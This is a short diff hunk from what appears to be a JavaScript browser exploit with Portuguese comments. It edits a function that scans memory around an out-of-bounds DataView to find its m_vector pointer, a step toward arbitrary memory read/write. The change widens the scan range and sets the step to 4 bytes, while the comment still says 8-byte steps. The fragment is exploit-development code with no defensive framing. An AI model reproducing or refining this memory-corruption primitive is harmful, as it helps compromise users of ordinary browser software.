@@ -69,9 +69,9 @@ function doubleToInt64(double) {
 async function findOobDataViewMVectorOffset(logFn, pauseFn, OOB_DV_METADATA_BASE, expected_m_vector_offset_relative_to_base, oob_dataview_instance, oob_total_buffer) {
     const FNAME = "findOobDataViewMVectorOffset";
     logFn(`[${FNAME}] Iniciando varredura para m_vector do oob_dataview.`, "info");
-    const start_offset_scan = OOB_DV_METADATA_BASE + expected_m_vector_offset_relative_to_base - 0x20; // Começa um pouco antes de 0x68
-    const end_offset_scan = OOB_DV_METADATA_BASE + expected_m_vector_offset_relative_to_base + 0x20;   // Vai um pouco depois de 0x68
-    const step = 0x8; // Varrer em passos de 8 bytes (qword)
+    const start_offset_scan = OOB_DV_METADATA_BASE + expected_m_vector_offset_relative_to_base - 0x80; // Começa um pouco antes de 0x68
+    const end_offset_scan = OOB_DV_METADATA_BASE + expected_m_vector_offset_relative_to_base + 0x80;   // Vai um pouco depois de 0x68
+    const step = 0x4; // Varrer em passos de 8 bytes (qword)
 
     if (!oob_dataview_instance || !oob_total_buffer) {
         logFn(`[${FNAME}] ERRO: Instâncias de oob_dataview ou oob_total_buffer são nulas para varredura.`, "error");
